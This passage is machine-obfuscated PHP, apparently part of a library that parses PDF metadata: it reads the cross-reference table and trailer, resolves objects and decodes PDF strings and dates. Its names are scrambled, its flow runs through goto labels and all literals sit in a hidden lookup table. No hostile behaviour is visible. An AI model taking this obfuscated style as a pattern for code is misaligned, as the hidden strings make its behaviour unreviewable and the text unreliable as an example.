$aµ”è‘…€Ô[$fïÑÍàÆà”[1516]] < $d≥œÕ⁄ûÍ…[1][0]) { $aµ”è‘…€Ô[$fïÑÍàÆà”[1516]] = $d≥œÕ⁄ûÍ…[1][0]; } preg_match_all($d±Òæ©úÆí, $Cª•º‰ó«¯[$fïÑÍàÆà”[1510]], $d≥œÕ⁄ûÍ…); goto cåÈÚπÊûµ; cåÈÚπÊûµ: if ($d≥œÕ⁄ûÍ…[1] && $aµ”è‘…€Ô[$fïÑÍàÆà”[1516]] < $d≥œÕ⁄ûÍ…[1][0]) { $aµ”è‘…€Ô[$fïÑÍàÆà”[1516]] = $d≥œÕ⁄ûÍ…[1][0]; } $aµ”è‘…€Ô = self::parseInfoItem($aµ”è‘…€Ô); return $aµ”è‘…€Ô; goto eì∫å…óµ´; dÓÜÏÂ„Ç: preg_match($d±Òæ©úÆí, $Cª•º‰ó«¯[$fïÑÍàÆà”[1510]], $d≥œÕ⁄ûÍ…); if (!$aµ”è‘…€Ô[$fïÑÍàÆà”[1512]] && count($d≥œÕ⁄ûÍ…) == 5) { $aµ”è‘…€Ô[$fïÑÍàÆà”[1512]] = $d≥œÕ⁄ûÍ…[3]; $aµ”è‘…€Ô[$fïÑÍàÆà”[1514]] = $d≥œÕ⁄ûÍ…[4]; } preg_match($fïÑÍàÆà”[1515], $Cª•º‰ó«¯[$fïÑÍàÆà”[1509]], $d≥œÕ⁄ûÍ…); goto cŒøﬂ£ÖªÑ; A∞æ˘Üíæñ: $d±Òæ©úÆí = $fïÑÍàÆà”[1513]; preg_match($d±Òæ©úÆí, $Cª•º‰ó«¯[$fïÑÍàÆà”[1509]], $d≥œÕ⁄ûÍ…); if (!$aµ”è‘…€Ô[$fïÑÍàÆà”[1512]] && count($d≥œÕ⁄ûÍ…) == 5) { $aµ”è‘…€Ô[$fïÑÍàÆà”[1512]] = $d≥œÕ⁄ûÍ…[3]; $aµ”è‘…€Ô[$fïÑÍàÆà”[1514]] = $d≥œÕ⁄ûÍ…[4]; } goto dÓÜÏÂ„Ç; cŒøﬂ£ÖªÑ: if ($d≥œÕ⁄ûÍ…) { $aµ”è‘…€Ô[$fïÑÍàÆà”[1324]] = $d≥œÕ⁄ûÍ…[1]; } $aµ”è‘…€Ô[$fïÑÍàÆà”[1516]] = 0; $d±Òæ©úÆí = $fïÑÍàÆà”[1517]; goto bÂ±”™íè≠; d£‚∏ñÀœ•: if ($CÁ”ü±§ƒ¢) { $C∞•ﬁÖÙˆ» = $CÁ”ü±§ƒ¢[$fïÑÍàÆà”[1511]][$fïÑÍàÆà”[1188]]; $aµ”è‘…€Ô = self::getObjectValue($Cª•º‰ó«¯, $CÁ”ü±§ƒ¢, $C∞•ﬁÖÙˆ»); } $aµ”è‘…€Ô = is_array($aµ”è‘…€Ô) ? $aµ”è‘…€Ô : array(); $aµ”è‘…€Ô[$fïÑÍàÆà”[1512]] = 0; goto A∞æ˘Üíæñ; cæÌÀï÷Öï: $fïÑÍàÆà” =& $_SERVER[—Ω]; $EÏ§òı¢áì = 32 * 1024; $Cª•º‰ó«¯ = array($fïÑÍàÆà”[785] => fopen($CÓà≠Ç»îÓ, $fïÑÍàÆà”[1166]), $fïÑÍàÆà”[75] => $CÓà≠Ç»îÓ, $fïÑÍàÆà”[77] => filesize($CÓà≠Ç»îÓ), $fïÑÍàÆà”[1508] => $EÏ§òı¢áì); goto e¯á¥Ò€Ñ€; eì∫å…óµ´: } private static function parseInfoItem($f∆Ù√ëø„ö) { $a⁄¥ÕË»◊≠ =& $_SERVER[—Ω]; if (!$f∆Ù√ëø„ö) { return !1; } $Dﬁ¯àÓ∆∏‚ = array($a⁄¥ÕË»◊≠[1325] => array($a⁄¥ÕË»◊≠[1518], $a⁄¥ÕË»◊≠[33]), $a⁄¥ÕË»◊≠[1519] => array($a⁄¥ÕË»◊≠[1520], $a⁄¥ÕË»◊≠[33]), $a⁄¥ÕË»◊≠[184] => array($a⁄¥ÕË»◊≠[1521], $a⁄¥ÕË»◊≠[207]), $a⁄¥ÕË»◊≠[107] => array($a⁄¥ÕË»◊≠[1522], $a⁄¥ÕË»◊≠[207]), $a⁄¥ÕË»◊≠[1516] => array($a⁄¥ÕË»◊≠[1516], $a⁄¥ÕË»◊≠[273]), $a⁄¥ÕË»◊≠[1512] => array($a⁄¥ÕË»◊≠[1512], $a⁄¥ÕË»◊≠[273]), $a⁄¥ÕË»◊≠[1514] => array($a⁄¥ÕË»◊≠[1514], $a⁄¥ÕË»◊≠[273]), $a⁄¥ÕË»◊≠[1523] => array($a⁄¥ÕË»◊≠[1524], $a⁄¥ÕË»◊≠[33]), $a⁄¥ÕË»◊≠[1525] => array($a⁄¥ÕË»◊≠[1526], $a⁄¥ÕË»◊≠[33]), $a⁄¥ÕË»◊≠[1527] => array($a⁄¥ÕË»◊≠[1324], $a⁄¥ÕË»◊≠[33])); $D™ÒÚıùŸ„ = array(); foreach ($Dﬁ¯àÓ∆∏‚ as $B®ñªµÀãç => $AﬂÒä≥ëπü) { if (!isset($f∆Ù√ëø„ö[$AﬂÒä≥ëπü[0]])) { continue; } $bÌØÑıñó‘ = $f∆Ù√ëø„ö[$AﬂÒä≥ëπü[0]]; if (!$bÌØÑıñó‘ || is_array($bÌØÑıñó‘)) { continue; } switch ($AﬂÒä≥ëπü[1]) { case $a⁄¥ÕË»◊≠[273]: $bÌØÑıñó‘ = intval($bÌØÑıñó‘); break; case $a⁄¥ÕË»◊≠[207]: if (substr($bÌØÑıñó‘, 0, 2) == $a⁄¥ÕË»◊≠[1528]) { $bÌØÑıñó‘ = substr($bÌØÑıñó‘, 2, 14); } if (strtotime($bÌØÑıñó‘)) { $bÌØÑıñó‘ = date($a⁄¥ÕË»◊≠[1529], strtotime($bÌØÑıñó‘)); } break; } $D™ÒÚıùŸ„[$B®ñªµÀãç] = $bÌØÑıñó‘; } return $D™ÒÚıùŸ„; } private static function decodeXref(&$E±ÉËàµÀÑ) { goto d ÕÓëÁﬁƒ; a“˘—É‰§Æ: if ($E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[77]] - $Aú¨Û∫˜Ò€ > $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[1508]]) { $aÍ…Ø•èÿï = 4 * $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[1508]]; $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[1508]] = $aÍ…Ø•èÿï; $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[1509]] = StreamWrapperIO::read($E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[75]], 0, $aÍ…Ø•èÿï); $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[1510]] = StreamWrapperIO::read($E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[75]], $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[77]] - $aÍ…Ø•èÿï, $aÍ…Ø•èÿï); $açπÚœÈ§… = $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[1510]]; } $cåä¿ú¿æ• = 0; preg_match_all($F≥ˆÔ·‚ˆ◊[1532], $açπÚœÈ§…, $EŸ≈öÖÏÇ–); goto d◊ÿÃäã®Œ; C‰∆÷Ùªû£: $a≥±è§œ§¿ = $F≥ˆÔ·‚ˆ◊[1531]; if (!preg_match_all($a≥±è§œ§¿, $açπÚœÈ§…, $EŸ≈öÖÏÇ–, PREG_SET_ORDER, 0)) { return !1; } $Aú¨Û∫˜Ò€ = intval($EŸ≈öÖÏÇ–[0][1]); goto a“˘—É‰§Æ; d◊ÿÃäã®Œ: foreach ($EŸ≈öÖÏÇ–[3] as $eóäé¶‰°ó => $b’ïïåÁÕ≤) { if ($EŸ≈öÖÏÇ–[3][$eóäé¶‰°ó] == $F≥ˆÔ·‚ˆ◊[1533]) { $b´∏œ„Ã¯· = $cåä¿ú¿æ• . $F≥ˆÔ·‚ˆ◊[70] . intval($EŸ≈öÖÏÇ–[2][$eóäé¶‰°ó]); $d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1530]][$b´∏œ„Ã¯·] = intval($EŸ≈öÖÏÇ–[1][$eóäé¶‰°ó]); ++$cåä¿ú¿æ•; } else { if ($EŸ≈öÖÏÇ–[3][$eóäé¶‰°ó] == $F≥ˆÔ·‚ˆ◊[1534]) { ++$cåä¿ú¿æ•; } else { } } } if (preg_match_all($F≥ˆÔ·‚ˆ◊[1535], $açπÚœÈ§…, $EŸ≈öÖÏÇ–)) { $Bœ„†Œïùû = $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[77]] - $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[1508]]; foreach ($EŸ≈öÖÏÇ–[0] as $eóäé¶‰°ó => $e¡µ‰Œƒß) { $e∞Æ›ƒ•»õ = $EŸ≈öÖÏÇ–[1][$eóäé¶‰°ó] . $F≥ˆÔ·‚ˆ◊[70] . $EŸ≈öÖÏÇ–[2][$eóäé¶‰°ó]; $d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1530]][$e∞Æ›ƒ•»õ] = strpos($açπÚœÈ§…, $e¡µ‰Œƒß) + $Bœ„†Œïùû + 1; } } if (preg_match_all($F≥ˆÔ·‚ˆ◊[1536], $açπÚœÈ§…, $EŸ≈öÖÏÇ–)) { $d§ßÂ£öãß = count($EŸ≈öÖÏÇ–[1]) == 1 ? $EŸ≈öÖÏÇ–[1][0] : $EŸ≈öÖÏÇ–[1][1]; } else { $d§ßÂ£öãß = substr($açπÚœÈ§…, -1024 * 5); } goto FÙÌπ¡è—ø; FÙÌπ¡è—ø: if (preg_match($F≥ˆÔ·‚ˆ◊[1537], $d§ßÂ£öãß, $EŸ≈öÖÏÇ–) > 0) { $d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1511]][$F≥ˆÔ·‚ˆ◊[77]] = intval($EŸ≈öÖÏÇ–[1]); } if (preg_match($F≥ˆÔ·‚ˆ◊[1538], $d§ßÂ£öãß, $EŸ≈öÖÏÇ–) > 0) { $d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1511]][$F≥ˆÔ·‚ˆ◊[1539]] = intval($EŸ≈öÖÏÇ–[1]) . $F≥ˆÔ·‚ˆ◊[70] . intval($EŸ≈öÖÏÇ–[2]); } if (preg_match($F≥ˆÔ·‚ˆ◊[1540], $d§ßÂ£öãß, $EŸ≈öÖÏÇ–) > 0) { $d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1511]][$F≥ˆÔ·‚ˆ◊[1541]] = intval($EŸ≈öÖÏÇ–[1]) . $F≥ˆÔ·‚ˆ◊[70] . intval($EŸ≈öÖÏÇ–[2]); } goto fÍ⁄ïâÿÂ”; d ÕÓëÁﬁƒ: $F≥ˆÔ·‚ˆ◊ =& $_SERVER[—Ω]; $açπÚœÈ§… = $E±ÉËàµÀÑ[$F≥ˆÔ·‚ˆ◊[1510]]; $d§îå±Ùàï = array($F≥ˆÔ·‚ˆ◊[1511] => array(), $F≥ˆÔ·‚ˆ◊[1530] => array()); goto C‰∆÷Ùªû£; fÍ⁄ïâÿÂ”: if (preg_match($F≥ˆÔ·‚ˆ◊[1542], $d§ßÂ£öãß, $EŸ≈öÖÏÇ–) > 0) { $d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1511]][$F≥ˆÔ·‚ˆ◊[1188]] = intval($EŸ≈öÖÏÇ–[1]) . $F≥ˆÔ·‚ˆ◊[70] . intval($EŸ≈öÖÏÇ–[2]); } if (preg_match($F≥ˆÔ·‚ˆ◊[1543], $d§ßÂ£öãß, $EŸ≈öÖÏÇ–) > 0) { $d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1511]][$F≥ˆÔ·‚ˆ◊[364]] = array(); $d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1511]][$F≥ˆÔ·‚ˆ◊[364]][0] = $EŸ≈öÖÏÇ–[1]; $d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1511]][$F≥ˆÔ·‚ˆ◊[364]][1] = $EŸ≈öÖÏÇ–[2]; } if (!$d§îå±Ùàï[$F≥ˆÔ·‚ˆ◊[1511]][$F≥ˆÔ·‚ˆ◊[1188]]) { return !1; } goto b—óè≈••√; b—óè≈••√: if (preg_match($F≥ˆÔ·‚ˆ◊[1544], $d§ßÂ£öãß, $EŸ≈öÖÏÇ–) > 0) { } return $d§îå±Ùàï; goto EπÃÁæ∆≤∑; EπÃÁæ∆≤∑: } private static function getObjectValue($E·ÿ¯†Í¡–, $bô¶®âÜÌ¯, $c÷«‚ìñø¶) { goto d«ÛÖÜÏÁù; b«Óá»„©â: return $BØ≈¢¶™ºã; goto f‰ÖúÍ⁄ÔÉ; d«ÛÖÜÏÁù: $e∏èÖ¿‚µ‚ =& $_SERVER[—Ω]; $C⁄ïÜ«õñ≥ = self::getObject($E·ÿ¯†Í¡–, $bô¶®âÜÌ¯[$e∏èÖ¿‚µ‚[1530]][$c÷«‚ìñø¶]); if (is_string($C⁄ïÜ«õñ≥[1])) { return $C⁄ïÜ«õñ≥[1]; } goto a®ü•ÚâéÑ; a®ü•ÚâéÑ: if (!is_array($C⁄ïÜ«õñ≥[1])) { return array(); } $BØ≈¢¶™ºã = array(); for ($EàôíÌà¡‹ = 0; $EàôíÌà¡‹ < count($C⁄ïÜ«õñ≥[1]); $EàôíÌà¡‹ += 2) { $dì££éœïä = $C⁄ïÜ«õñ≥[1][$EàôíÌà¡‹]; $B¥Âªâéê› = $C⁄ïÜ«õñ≥[1][$EàôíÌà¡‹ + 1]; if (count($dì££éœïä) == 3 && $dì££éœïä[0] == $e∏èÖ¿‚µ‚[8]) { $FÂÏ◊ØÛ®È = !1; if ($B¥Âªâéê›[0] == $e∏èÖ¿‚µ‚[1545]) { $B¥Âªâéê› = self::getObject($E·ÿ¯†Í¡–, $bô¶®âÜÌ¯[$e∏èÖ¿‚µ‚[1530]][$B¥Âªâéê›[1]]); } $FÂÏ◊ØÛ®È = $B¥Âªâéê›[1]; if ($FÂÏ◊ØÛ®È === !1) { continue; } if (is_string($FÂÏ◊ØÛ®È)) { $FÂÏ◊ØÛ®È = self::decodeStr($FÂÏ◊ØÛ®È); } $BØ≈¢¶™ºã[$dì££éœïä[1]] = $FÂÏ◊ØÛ®È; } } goto b«Óá»„©â; f‰ÖúÍ⁄ÔÉ: } private static function getObject($A†ó÷Ê¶ÿ∞, $A†˜üœÇ≤±) { $d£≥ú√∏õï = self::getObjectItem($A†ó÷Ê¶ÿ∞, $A†˜üœÇ≤±); $d£≥ú√∏õï = self::getObjectItem($A†ó÷Ê¶ÿ∞, $d£≥ú√∏õï[2]); return $d£≥ú√∏õï; } private static function getObjectItem($F∂∫àõÖ÷ö, $DÑÈá¿ﬂ‡ƒ) { goto dπÏáÑáÇ∆; B–÷€Ç“Û…: $cÿòÑ¡Øº∑ = $DÑÈá¿ﬂ‡ƒ >= $Cé∞Ç´©ÀÚ ? $DÑÈá¿ﬂ‡ƒ - $Cé∞Ç´©ÀÚ : $DÑÈá¿ﬂ‡ƒ; $B‰ï•°‹µœ = $DÑÈá¿ﬂ‡ƒ >= $Cé∞Ç´©ÀÚ ? $F∂∫àõÖ÷ö[$eöÕ“ÆîÎã[1510]] : $F∂∫àõÖ÷ö[$eöÕ“ÆîÎã[1509]]; if ($DÑÈá¿ﬂ‡ƒ > $D √Ì¨Ò¶∫ && $DÑÈá¿ﬂ‡ƒ <= $Cé∞Ç´©ÀÚ) { $cÿòÑ¡Øº∑ = 0; $B‰ï•°‹µœ = StreamWrapperIO::read($F∂∫àõÖ÷ö[$eöÕ“ÆîÎã[75]], $DÑÈá¿ﬂ‡ƒ, $D √Ì¨Ò¶∫); } goto AÙàâ•˜˜Ê; AÙàâ•˜˜Ê: $E¥÷ı¿‡óÓ = self::getRawObject($B‰ï•°‹µœ, $cÿòÑ¡Øº∑); if ($DÑÈá¿ﬂ‡ƒ >= $Cé∞Ç´©ÀÚ) { $E¥÷ı¿‡óÓ[2] = $E¥÷ı¿‡óÓ[2] + $Cé∞Ç´©ÀÚ; } else { if ($DÑÈá¿ﬂ‡ƒ > $D √Ì¨Ò¶∫ && $DÑÈá¿ﬂ‡ƒ <= $Cé∞Ç´©ÀÚ) { $E¥÷ı¿‡óÓ[2] = $E¥÷ı¿‡óÓ[2] + $DÑÈá¿ﬂ‡ƒ; } } return $E¥÷ı¿‡óÓ; goto FÓ«ıûâÉ; dπÏáÑáÇ∆: $eöÕ“ÆîÎã =& $_SERVER[—Ω]; $D √Ì¨Ò¶∫ = $F∂∫àõÖ÷ö[$eöÕ“ÆîÎã[1508]]; $Cé∞Ç´©ÀÚ = $F∂∫àõÖ÷ö[$eöÕ“ÆîÎã[77]] - $D √Ì¨Ò¶∫; goto B–÷€Ç“Û…; FÓ«ıûâÉ: } private static function decodeStr($cÂôéıèÉï) { goto a±—ÕÖµùÏ; a±—ÕÖµùÏ: $dêÚŸ•èë„ =& $_SERVER[—Ω]; $cÂôéıèÉï = str_replace(array($dêÚŸ•èë„[1546], $dêÚŸ•èë„[1547], $dêÚŸ•èë„[1548], $dêÚŸ•èë„[1549], $dêÚŸ•èë„[1550], $dêÚŸ•èë„[1551], $dêÚŸ•èë„[1552], $dêÚŸ•èë„[1553]), array($dêÚŸ•èë„[95], $dêÚŸ•èë„[50], $dêÚŸ•èë„[8], $dêÚŸ•èë„[245], $dêÚŸ•èë„[822], $dêÚŸ•èë„[214], $dêÚŸ•èë„[996], $dêÚŸ•èë„[327]), $cÂôéıèÉï); $aˆ‚œóß˜Ω = preg_split($dêÚŸ•èë„[1554], $cÂôéıèÉï, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto D«ºÉ¯Çì√; fË§◊ÕáÇŸ: return $cÂôéıèÉï; goto b‘Üƒ…Ê–Ï; D«ºÉ¯Çì√: $cÂôéıèÉï = $dêÚŸ•èë„[33]; foreach ($aˆ‚œóß˜Ω as $C ê¯˜„—Ñ) { if (preg_match($dêÚŸ•èë„[1555], $C ê¯˜„—Ñ)) { $cÂôéıèÉï .= \chr(octdec(trim($C ê¯˜„—Ñ, $dêÚŸ•èë„[95]))); } else { $cÂôéıèÉï .= $C ê¯˜„—Ñ; } } $aˆ‚œóß˜Ω = preg_split($dêÚŸ•èë„[1556], $cÂôéıèÉï, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto céŸ€«ê≥∆; EõÒÎªñ‚∆: $cÂôéıèÉï = $dêÚŸ•èë„[33]; foreach ($aˆ‚œóß˜Ω as $C ê¯˜„—Ñ) { if (preg_match($dêÚŸ•èë„[1560], $C ê¯˜„—Ñ) && !1 === stripos($C ê¯˜„—Ñ, $dêÚŸ•èë„[1561])) { $C ê¯˜„—Ñ = preg_replace($dêÚŸ•èë„[1562], $dêÚŸ•èë„[33], $C ê¯˜„—Ñ); $C ê¯˜„—Ñ = trim($C ê¯˜„—Ñ, $dêÚŸ•èë„[932]); $C ê¯˜„—Ñ = pack($dêÚŸ•èë„[1563], $C ê¯˜„—Ñ); $cÂôéıèÉï .= $C ê¯˜„—Ñ; } else { $cÂôéıèÉï .= $C ê¯˜„—Ñ; } } if (preg_match($dêÚŸ•èë„[1564], $cÂôéıèÉï)) { $CôÚŸËíàæ = substr($cÂôéıèÉï, 2); $cÂôéıèÉï = $dêÚŸ•èë„[33]; $a¡Õ„ø˜√† = strlen($CôÚŸËíàæ); for ($bûéÇÜ®∏ﬁ = 0; $bûéÇÜ®∏ﬁ < $a¡Õ„ø˜√†; $bûéÇÜ®∏ﬁ += 2) { $A€˘Øàä®  = hexdec(bin2hex(substr($CôÚŸËíàæ, $bûéÇÜ®∏ﬁ, 2))); $cÂôéıèÉï .= mb_convert_encoding($dêÚŸ•èë„[1565] . intval($A€˘Øàä® ) . $dêÚŸ•èë„[67], $dêÚŸ•èë„[1566], $dêÚŸ•èë„[1567]); } } goto fË§◊ÕáÇŸ; céŸ€«ê≥∆: $cÂôéıèÉï = $dêÚŸ•èë„[33]; foreach ($aˆ‚œóß˜Ω as $C ê¯˜„—Ñ) { if (preg_match($dêÚŸ•èë„[1557], $C ê¯˜„—Ñ)) { $cÂôéıèÉï .= \chr(hexdec(trim($C ê¯˜„—Ñ, $dêÚŸ•èë„[1558]))); } else { $cÂôéıèÉï .= $C ê¯˜„—Ñ; } } $aˆ‚œóß˜Ω = preg_split($dêÚŸ•èë„[1559], $cÂôéıèÉï, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto EõÒÎªñ‚∆; b‘Üƒ…Ê–Ï: } private static function getRawObject($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈ = 0) { goto fÓ–›≤ôú; fÓ–›≤ôú: $eµÌÛ∞™Ø =& $_SERVER[—Ω]; $dË£»è¿¿õ = $eµÌÛ∞™Ø[33]; $F¿°óäíÜô = $eµÌÛ∞™Ø[33]; goto f¯É®Õè„¢; céã≈ïÍ•Ω: return array($dË£»è¿¿õ, $F¿°óäíÜô, $DàÚÖ˜ü—≈); goto DèúÇö…ãæ; f¯É®Õè„¢: $DàÚÖ˜ü—≈ += strspn($fä¶‰üΩ©Ø, $eµÌÛ∞™Ø[1568], $DàÚÖ˜ü—≈); $EØ≈¨öÜ˘ë = $fä¶‰üΩ©Ø[$DàÚÖ˜ü—≈]; switch ($EØ≈¨öÜ˘ë) { case $eµÌÛ∞™Ø[1569]: $A§è…úﬂöΩ = strcspn($fä¶‰üΩ©Ø, $eµÌÛ∞™Ø[1570], $DàÚÖ˜ü—≈); if ($A§è…úﬂöΩ > 0) { $DàÚÖ˜ü—≈ += $A§è…úﬂöΩ; return self::getRawObject($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈); } break; case $eµÌÛ∞™Ø[8]: $dË£»è¿¿õ = $EØ≈¨öÜ˘ë; ++$DàÚÖ˜ü—≈; $d ï⁄ö®∏  = preg_match($eµÌÛ∞™Ø[1571], substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, 256), $BáÒÒ…˘áñ); if (1 == $d ï⁄ö®∏ ) { $F¿°óäíÜô = $BáÒÒ…˘áñ[1]; $DàÚÖ˜ü—≈ += strlen($F¿°óäíÜô); } break; case $eµÌÛ∞™Ø[245]: case $eµÌÛ∞™Ø[822]: $dË£»è¿¿õ = $EØ≈¨öÜ˘ë; ++$DàÚÖ˜ü—≈; $b™æ≈é”Ÿ€ = $DàÚÖ˜ü—≈; if ($eµÌÛ∞™Ø[245] == $EØ≈¨öÜ˘ë) { $cÕ¯Ò◊∆µ’ = 1; while ($cÕ¯Ò◊∆µ’ > 0) { if (!isset($fä¶‰üΩ©Ø[$b™æ≈é”Ÿ€])) { break; } $aÎåƒÎÈÊÖ = $fä¶‰üΩ©Ø[$b™æ≈é”Ÿ€]; switch ($aÎåƒÎÈÊÖ) { case $eµÌÛ∞™Ø[95]: ++$b™æ≈é”Ÿ€; break; case $eµÌÛ∞™Ø[245]: ++$cÕ¯Ò◊∆µ’; break; case $eµÌÛ∞™Ø[822]: --$cÕ¯Ò◊∆µ’; break; } ++$b™æ≈é”Ÿ€; } $F¿°óäíÜô = substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, $b™æ≈é”Ÿ€ - $DàÚÖ˜ü—≈ - 1); $DàÚÖ˜ü—≈ = $b™æ≈é”Ÿ€; } break; case $eµÌÛ∞™Ø[154]: case $eµÌÛ∞™Ø[472]: $dË£»è¿¿õ = $EØ≈¨öÜ˘ë; ++$DàÚÖ˜ü—≈; if ($eµÌÛ∞™Ø[154] == $EØ≈¨öÜ˘ë) { $F¿°óäíÜô = array(); do { $c”¢¢õ∆ıÚ = $DàÚÖ˜ü—≈; $Bùùµ∫–±Û = self::getRawObject($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈); $DàÚÖ˜ü—≈ = $Bùùµ∫–±Û[2]; $F¿°óäíÜô[] = $Bùùµ∫–±Û; } while ($eµÌÛ∞™Ø[472] != $Bùùµ∫–±Û[0] && $DàÚÖ˜ü—≈ != $c”¢¢õ∆ıÚ); array_pop($F¿°óäíÜô); } break; case $eµÌÛ∞™Ø[931]: case $eµÌÛ∞™Ø[934]: if (isset($fä¶‰üΩ©Ø[$DàÚÖ˜ü—≈ + 1]) && $fä¶‰üΩ©Ø[$DàÚÖ˜ü—≈ + 1] == $EØ≈¨öÜ˘ë) { $dË£»è¿¿õ = $EØ≈¨öÜ˘ë . $EØ≈¨öÜ˘ë; $DàÚÖ˜ü—≈ += 2; if ($eµÌÛ∞™Ø[931] == $EØ≈¨öÜ˘ë) { $F¿°óäíÜô = array(); do { $c”¢¢õ∆ıÚ = $DàÚÖ˜ü—≈; $Bùùµ∫–±Û = self::getRawObject($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈); $DàÚÖ˜ü—≈ = $Bùùµ∫–±Û[2]; $F¿°óäíÜô[] = $Bùùµ∫–±Û; } while ($eµÌÛ∞™Ø[1572] != $Bùùµ∫–±Û[0] && $DàÚÖ˜ü—≈ != $c”¢¢õ∆ıÚ); array_pop($F¿°óäíÜô); } } else { $dË£»è¿¿õ = $EØ≈¨öÜ˘ë; ++$DàÚÖ˜ü—≈; $d ï⁄ö®∏  = preg_match($eµÌÛ∞™Ø[1573], substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈), $BáÒÒ…˘áñ); if ($eµÌÛ∞™Ø[931] == $EØ≈¨öÜ˘ë && 1 == $d ï⁄ö®∏ ) { $F¿°óäíÜô = strtr($BáÒÒ…˘áñ[1], $eµÌÛ∞™Ø[1574], $eµÌÛ∞™Ø[33]); $DàÚÖ˜ü—≈ += \strlen($BáÒÒ…˘áñ[0]); } elseif (!1 !== ($f∞ºâú¨≈„ = strpos($fä¶‰üΩ©Ø, $eµÌÛ∞™Ø[934], $DàÚÖ˜ü—≈))) { $DàÚÖ˜ü—≈ = $f∞ºâú¨≈„ + 1; } } break; default: if ($eµÌÛ∞™Ø[1575] == substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, 6)) { $dË£»è¿¿õ = $eµÌÛ∞™Ø[1575]; $DàÚÖ˜ü—≈ += 6; } elseif ($eµÌÛ∞™Ø[101] == substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, 4)) { $dË£»è¿¿õ = $eµÌÛ∞™Ø[101]; $DàÚÖ˜ü—≈ += 4; $F¿°óäíÜô = $eµÌÛ∞™Ø[101]; } elseif ($eµÌÛ∞™Ø[1576] == substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, 4)) { $dË£»è¿¿õ = $eµÌÛ∞™Ø[1577]; $DàÚÖ˜ü—≈ += 4; $F¿°óäíÜô = $eµÌÛ∞™Ø[1576]; } elseif ($eµÌÛ∞™Ø[1578] == substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, 5)) { $dË£»è¿¿õ = $eµÌÛ∞™Ø[1577]; $DàÚÖ˜ü—≈ += 5; $F¿°óäíÜô = $eµÌÛ∞™Ø[1578]; } elseif ($eµÌÛ∞™Ø[1579] == substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, 6)) { $dË£»è¿¿õ = $eµÌÛ∞™Ø[1579]; $DàÚÖ˜ü—≈ += 6; if (1 == preg_match($eµÌÛ∞™Ø[1580], substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈), $BáÒÒ…˘áñ)) { $DàÚÖ˜ü—≈ += strlen($BáÒÒ…˘áñ[0]); $f‡ÁÌÇ©ç™ = $eµÌÛ∞™Ø[1581]; $d ï⁄ö®∏  = preg_match($f‡ÁÌÇ©ç™, substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈), $BáÒÒ…˘áñ, PREG_OFFSET_CAPTURE); if (1 == $d ï⁄ö®∏ ) { $F¿°óäíÜô = substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, $BáÒÒ…˘áñ[0][1]); $DàÚÖ˜ü—≈ += $BáÒÒ…˘áñ[1][1]; } } } elseif ($eµÌÛ∞™Ø[1582] == substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, 9)) { $dË£»è¿¿õ = $eµÌÛ∞™Ø[1582]; $DàÚÖ˜ü—≈ += 9; } elseif (1 == preg_match($eµÌÛ∞™Ø[1583], substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, 33), $BáÒÒ…˘áñ)) { $dË£»è¿¿õ = $eµÌÛ∞™Ø[1545]; $DàÚÖ˜ü—≈ += strlen($BáÒÒ…˘áñ[0]); $F¿°óäíÜô = intval($BáÒÒ…˘áñ[1]) . $eµÌÛ∞™Ø[70] . intval($BáÒÒ…˘áñ[2]); } elseif (1 == preg_match($eµÌÛ∞™Ø[1584], substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, 33), $BáÒÒ…˘áñ)) { $dË£»è¿¿õ = $eµÌÛ∞™Ø[1585]; $F¿°óäíÜô = intval($BáÒÒ…˘áñ[1]) . $eµÌÛ∞™Ø[70] . intval($BáÒÒ…˘áñ[2]); $DàÚÖ˜ü—≈ += strlen($BáÒÒ…˘áñ[0]); } elseif (($Dƒ§•æ°ë† = strspn($fä¶‰üΩ©Ø, $eµÌÛ∞™Ø[1586], $DàÚÖ˜ü—≈)) > 0) { $dË£»è¿¿õ = $eµÌÛ∞™Ø[1587]; $F¿°óäíÜô = substr($fä¶‰üΩ©Ø, $DàÚÖ˜ü—≈, $Dƒ§•æ°ë†); $DàÚÖ˜ü—≈ += $Dƒ§•æ°ë†; } break; } goto céã≈ïÍ•Ω; DèúÇö…ãæ: } } class GetInfo { private static $fileTypeArray; public static function 